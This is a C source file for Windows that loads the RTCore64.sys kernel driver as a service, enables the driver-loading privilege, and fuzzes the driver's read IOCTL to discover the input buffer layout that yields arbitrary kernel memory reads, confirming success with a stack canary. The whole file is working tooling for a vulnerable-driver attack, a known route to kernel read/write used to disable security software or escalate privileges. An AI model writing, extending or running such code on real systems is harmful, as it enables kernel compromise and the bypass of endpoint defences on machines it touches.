/*
 * rtcore64_layout_fuzz.c
 * finds the exact input buffer layout RTCore64 expects by
 * testing every possible offset for the address field.
 * any non-87 result = working layout found.
 *
 * clang rtcore64_layout_fuzz.c -o rtcore64_layout_fuzz.exe -lkernel32 -ladvapi32
 * run as Admin: .\rtcore64_layout_fuzz.exe ..\..\RTCore64.sys
 */
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define RT_DEVICE     "\\\\.\\RTCore64"
#define RT_SVC        "RTCore64"
#define RT_READ       0x80002048UL
#define RT_WRITE      0x8000204CUL

static BOOL svc_load(const char *abs) {
    char nt[MAX_PATH+8];
    snprintf(nt, sizeof(nt)-1, "\\??\\%s", abs);
    SC_HANDLE scm = OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if (!scm) return FALSE;
    SC_HANDLE s = OpenServiceA(scm, RT_SVC, SERVICE_ALL_ACCESS);
    if (s) {
        SERVICE_STATUS ss={0};
        ControlService(s,SERVICE_CONTROL_STOP,&ss);
        Sleep(300); DeleteService(s); CloseServiceHandle(s); Sleep(300);
    }
    s = CreateServiceA(scm,RT_SVC,RT_SVC,SERVICE_ALL_ACCESS,
                       SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,
                       SERVICE_ERROR_NORMAL,nt,NULL,NULL,NULL,NULL,NULL);
    if (!s) { CloseServiceHandle(scm); return FALSE; }
    BOOL ok = StartServiceA(s,0,NULL);
    if (!ok && GetLastError()==ERROR_SERVICE_ALREADY_RUNNING) ok=TRUE;
    CloseServiceHandle(s); CloseServiceHandle(scm);
    if (ok) Sleep(400);
    return ok;
}
static void svc_unload(void) {
    SC_HANDLE scm = OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if (!scm) return;
    SC_HANDLE s = OpenServiceA(scm,RT_SVC,SERVICE_ALL_ACCESS);
    if (s) {
        SERVICE_STATUS ss={0};
        ControlService(s,SERVICE_CONTROL_STOP,&ss);
        Sleep(200); DeleteService(s); CloseServiceHandle(s);
    }
    CloseServiceHandle(scm);
}

int main(int argc, char **argv) {
    const char *path = argc>1 ? argv[1] : "..\\..\\RTCore64.sys";
    char abs[MAX_PATH]={0};
    GetFullPathNameA(path, MAX_PATH, abs, NULL);

    printf("[*] RTCore64 layout fuzz\n[*] driver: %s\n\n", abs);

    /* SeLoadDriverPrivilege */
    HANDLE ht=NULL;
    OpenProcessToken(GetCurrentProcess(),
                     TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&ht);
    LUID luid; LookupPrivilegeValueA(NULL,"SeLoadDriverPrivilege",&luid);
    TOKEN_PRIVILEGES tp={1,{{luid,SE_PRIVILEGE_ENABLED}}};
    AdjustTokenPrivileges(ht,FALSE,&tp,sizeof(tp),NULL,NULL);
    CloseHandle(ht);

    if (!svc_load(abs)) {
        printf("[-] load failed: %lu\n", GetLastError()); return 1;
    }

    HANDLE dev = CreateFileA(RT_DEVICE,
                              GENERIC_READ|GENERIC_WRITE,0,NULL,
                              OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if (dev==INVALID_HANDLE_VALUE) {
        printf("[-] open failed: %lu\n", GetLastError());
        svc_unload(); return 1;
    }
    printf("[+] RTCore64 handle: %p\n\n", (void*)dev);

    /*
     * target: our own stack DWORD -- always readable by a ring-0 VA read
     * if the driver can read it, it'll return 0xDEADBEEF
     * if we get non-87 (even error=31 or error=5), the struct layout is right
     */
    volatile DWORD canary = 0xDEADBEEF;
    uint64_t target_va   = (uint64_t)(uintptr_t)&canary;
    printf("[*] target VA: 0x%016llX  canary=0x%08lX\n\n",
           (unsigned long long)target_va, (unsigned long)canary);

    printf("%-6s %-6s %-6s  %-8s  %-12s  %s\n",
           "addrOff","valOff","bufSz","result","value","err");
    printf("%-6s %-6s %-6s  %-8s  %-12s  %s\n",
           "-------","------","-----","------","-----","---");

    int hits = 0;

    /* fuzz: address at byte offsets 0,4,8,12,16,20
     *       value readback at offsets addr+4, addr+8, addr+12
     *       buffer sizes 12 to 48 in steps of 4
     */
    for (int addr_off = 0; addr_off <= 20; addr_off += 4) {
        for (int buf_sz = 12; buf_sz <= 48; buf_sz += 4) {
            if (addr_off + 8 > buf_sz) continue; /* addr must fit */

            /* build input buffer */
            uint8_t ibuf[64] = {0};
            uint8_t obuf[64] = {0};
            memcpy(ibuf + addr_off, &target_va, 8);

            DWORD ret = 0;
            BOOL ok = DeviceIoControl(dev, RT_READ,
                                       ibuf, (DWORD)buf_sz,
                                       obuf, (DWORD)buf_sz,
                                       &ret, NULL);
            DWORD err = ok ? 0 : GetLastError();

            if (err != 87) {
                /* non-87 result -- check every output offset for canary */
                for (int val_off = 0; val_off + 4 <= buf_sz; val_off += 4) {
                    DWORD outval = 0;
                    memcpy(&outval, obuf + val_off, 4);
                    printf("%-6d %-6d %-6d  %-8s  0x%08lX    %lu",
                           addr_off, val_off, buf_sz,
                           ok?"OK":"FAIL",
                           (unsigned long)outval,
                           (unsigned long)err);
                    if (outval == 0xDEADBEEF)
                        printf("  *** CANARY MATCH -- layout confirmed ***");
                    else if (err == 31)
                        printf("  (err=31: struct OK, VA access issue)");
                    else if (err == 5)
                        printf("  (err=5: access denied -- struct probably right)");
                    printf("\n");
                }
                hits++;
            }
        }
    }

    if (!hits) {
        printf("\n[!] all returned error=87\n");
        printf("[!] trying: same buf for input AND output (some drivers require this)\n\n");

        for (int addr_off = 0; addr_off <= 20; addr_off += 4) {
            for (int buf_sz = 16; buf_sz <= 40; buf_sz += 4) {
                if (addr_off + 8 > buf_sz) continue;
                uint8_t buf[64] = {0};
                memcpy(buf + addr_off, &target_va, 8);
                DWORD ret=0;
                BOOL ok=DeviceIoControl(dev, RT_READ,
                                         buf, (DWORD)buf_sz,
                                         buf, (DWORD)buf_sz,
                                         &ret, NULL);
                DWORD err=ok?0:GetLastError();
                if (err!=87) {
                    DWORD val=0; memcpy(&val, buf+addr_off+8, 4);
                    printf("SHARED_BUF addrOff=%d sz=%d  %s  val=0x%08lX  err=%lu%s\n",
                           addr_off,buf_sz,ok?"OK":"FAIL",
                           (unsigned long)val,(unsigned long)err,
                           val==0xDEADBEEF?" *** CANARY ***":"");
                    hits++;
                }
            }
        }
    }

    if (!hits)
        printf("[!] zero non-87 results -- "
               "this RTCore64 build may need different IOCTL codes\n");

    CloseHandle(dev);
    svc_unload();
    printf("\n[*] fuzz done -- %d non-87 results\n", hits);
    return 0;
}